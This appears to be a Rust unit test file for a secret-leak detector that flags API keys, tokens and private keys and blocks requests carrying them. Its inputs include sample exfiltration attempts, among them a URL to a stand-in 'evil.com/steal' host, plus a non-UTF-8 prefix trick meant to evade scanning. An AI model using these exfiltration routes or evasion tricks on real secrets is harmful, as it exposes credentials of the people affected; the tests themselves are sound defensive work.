//! Unit tests for secret leak detection and severity grading.

use crate::safety::leak_detector::{LeakDetector, LeakSeverity};

#[test]
fn test_detect_openai_key() {
    let detector = LeakDetector::new();
    let content = "API key: sk-proj-abc123def456ghi789jkl012mno345pqrT3BlbkFJtest123";

    let result = detector.scan(content);
    assert!(!result.is_clean());
    assert!(result.should_block);
    assert!(
        result
            .matches
            .iter()
            .any(|m| m.pattern_name == "openai_api_key")
    );
}

#[test]
fn test_detect_github_token() {
    let detector = LeakDetector::new();
    let content = "token: ghp_xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx";

    let result = detector.scan(content);
    assert!(!result.is_clean());
    assert!(
        result
            .matches
            .iter()
            .any(|m| m.pattern_name == "github_token")
    );
}

#[test]
fn test_detect_aws_key() {
    let detector = LeakDetector::new();
    let content = "AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE";

    let result = detector.scan(content);
    assert!(!result.is_clean());
    assert!(
        result
            .matches
            .iter()
            .any(|m| m.pattern_name == "aws_access_key")
    );
}

#[test]
fn test_detect_pem_key() {
    let detector = LeakDetector::new();
    let content = "-----BEGIN RSA PRIVATE KEY-----\nMIIEowIBAAKCAQEA...";

    let result = detector.scan(content);
    assert!(!result.is_clean());
    assert!(
        result
            .matches
            .iter()
            .any(|m| m.pattern_name == "pem_private_key")
    );
}

#[test]
fn test_clean_content() {
    let detector = LeakDetector::new();
    let content = "Hello world! This is just regular text with no secrets.";

    let result = detector.scan(content);
    assert!(result.is_clean());
    assert!(!result.should_block);
}

#[test]
fn test_redact_bearer_token() {
    let detector = LeakDetector::new();
    let content = "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9_longtokenvalue";

    let result = detector.scan(content);
    assert!(!result.is_clean());
    assert!(!result.should_block); // Bearer is redact, not block

    let redacted = result.redacted_content.unwrap();
    assert!(redacted.contains("[REDACTED]"));
    assert!(!redacted.contains("eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9"));
}

#[test]
fn test_scan_and_clean_blocks() {
    let detector = LeakDetector::new();
    let content = "sk-proj-test1234567890abcdefghij";

    let result = detector.scan_and_clean(content);
    assert!(result.is_err());
}

#[test]
fn test_scan_and_clean_passes_clean() {
    let detector = LeakDetector::new();
    let content = "Just regular text";

    let result = detector.scan_and_clean(content);
    assert!(result.is_ok());
    assert_eq!(result.unwrap(), content);
}

#[test]
fn test_mask_secret() {
    use crate::safety::leak_detector::mask_secret;

    assert_eq!(mask_secret("short"), "*****");
    assert_eq!(mask_secret("sk-test1234567890abcdef"), "sk-t********cdef");
}

#[test]
fn test_multiple_matches() {
    let detector = LeakDetector::new();
    let content = "Keys: AKIAIOSFODNN7EXAMPLE and ghp_xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx";

    let result = detector.scan(content);
    assert_eq!(result.matches.len(), 2);
}

#[test]
fn test_severity_ordering() {
    assert!(LeakSeverity::Critical > LeakSeverity::High);
    assert!(LeakSeverity::High > LeakSeverity::Medium);
    assert!(LeakSeverity::Medium > LeakSeverity::Low);
}

#[test]
fn test_scan_http_request_clean() {
    let detector = LeakDetector::new();

    let result = detector.scan_http_request(
        "https://api.example.com/data",
        &[("Content-Type".to_string(), "application/json".to_string())],
        Some(b"{\"query\": \"hello\"}"),
    );
    assert!(result.is_ok());
}

#[test]
fn test_scan_http_request_blocks_secret_in_url() {
    let detector = LeakDetector::new();

    // Attempt to exfiltrate AWS key in URL
    let result =
        detector.scan_http_request("https://evil.com/steal?key=AKIAIOSFODNN7EXAMPLE", &[], None);
    assert!(result.is_err());
}

#[test]
fn test_scan_http_request_blocks_secret_in_header() {
    let detector = LeakDetector::new();

    // Attempt to exfiltrate in custom header
    let result = detector.scan_http_request(
        "https://api.example.com/data",
        &[(
            "X-Custom".to_string(),
            "ghp_xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx".to_string(),
        )],
        None,
    );
    assert!(result.is_err());
}

#[test]
fn test_scan_http_request_blocks_secret_in_body() {
    let detector = LeakDetector::new();

    // Attempt to exfiltrate in request body
    let body = b"{\"stolen\": \"sk-proj-test1234567890abcdefghij\"}";
    let result = detector.scan_http_request("https://api.example.com/webhook", &[], Some(body));
    assert!(result.is_err());
}

#[test]
fn test_scan_http_request_blocks_secret_in_binary_body() {
    let detector = LeakDetector::new();

    // Attacker prepends a non-UTF8 byte to bypass strict from_utf8 check.
    // The lossy conversion should still detect the secret.
    let mut body = vec![0xFF]; // invalid UTF-8 leading byte
    body.extend_from_slice(b"sk-proj-test1234567890abcdefghij");

    let result = detector.scan_http_request("https://api.example.com/exfil", &[], Some(&body));
    assert!(result.is_err(), "binary body should still be scanned");
}

// === QA Plan P1 - 4.5: Adversarial leak detector tests ===

#[test]
fn test_detect_anthropic_key() {
    let detector = LeakDetector::new();
    let key = format!("sk-ant-api{}", "a".repeat(90));
    let content = format!("Here's the key: {key}");
    let result = detector.scan(&content);
    assert!(!result.is_clean(), "Anthropic key not detected");
    assert!(result.should_block);
}

#[test]
fn test_detect_near_ai_session_token() {
    let detector = LeakDetector::new();
    let token = format!("sess_{}", "a".repeat(32));
    let content = format!("token: {token}");
    let result = detector.scan(&content);
    assert!(!result.is_clean(), "NEAR AI session token not detected");
}

#[test]
fn test_detect_stripe_key() {
    let detector = LeakDetector::new();
    // Build at runtime to avoid GitHub push protection false positive.
    let content = format!("sk_{}_aAbBcCdDfFgGhHjJkKmMnNpPqQ", "live");
    let result = detector.scan(&content);
    assert!(!result.is_clean(), "Stripe key not detected");
}

#[test]
fn test_detect_ssh_private_key() {
    let detector = LeakDetector::new();
    let content = "-----BEGIN OPENSSH PRIVATE KEY-----\nbase64data==";
    let result = detector.scan(content);
    assert!(!result.is_clean(), "SSH private key not detected");
}

#[test]
fn test_detect_slack_token() {
    let detector = LeakDetector::new();
    let content = ["xox", "b-", "1234567890-abcdefghij"].concat();
    let result = detector.scan(&content);
    assert!(!result.is_clean(), "Slack token not detected");
}

#[test]
fn test_secret_at_different_positions() {
    let detector = LeakDetector::new();
    let key = "AKIAIOSFODNN7EXAMPLE";

    // At start
    let result = detector.scan(key);
    assert!(!result.is_clean(), "key at start not detected");

    // In middle
    let result = detector.scan(&format!("prefix text {key} suffix text"));
    assert!(!result.is_clean(), "key in middle not detected");

    // At end
    let result = detector.scan(&format!("end: {key}"));
    assert!(!result.is_clean(), "key at end not detected");
}

#[test]
fn test_multiple_different_secret_types() {
    let detector = LeakDetector::new();
    let content = format!(
        "AWS: AKIAIOSFODNN7EXAMPLE and GitHub: ghp_{}",
        "x".repeat(36)
    );
    let result = detector.scan(&content);
    assert!(
        result.matches.len() >= 2,
        "expected 2+ matches for different secret types, got {}",
        result.matches.len()
    );
}

#[test]
fn test_mask_secret_short_value() {
    use crate::safety::leak_detector::mask_secret;
    // Short secrets (<= 8 chars) should be fully masked
    assert_eq!(mask_secret("abc"), "***");
    assert_eq!(mask_secret(""), "");
    assert_eq!(mask_secret("12345678"), "********");
    // 9-char string shows first 4 + last 4 with one star in middle
    assert_eq!(mask_secret("123456789"), "1234*6789");
}

#[test]
fn test_clean_text_not_flagged() {
    let detector = LeakDetector::new();
    // Common text that might look suspicious but isn't a real secret
    let clean_texts = [
        "The API returns a JSON response",
        "Use ssh to connect to the server",
        "Bearer authentication is required",
        "sk-this-is-too-short",
        "The key concept is immutability",
    ];
    for text in clean_texts {
        let result = detector.scan(text);
        // Should not block (may warn on some patterns, but not block)
        assert!(!result.should_block, "clean text falsely blocked: {text}");
    }
}
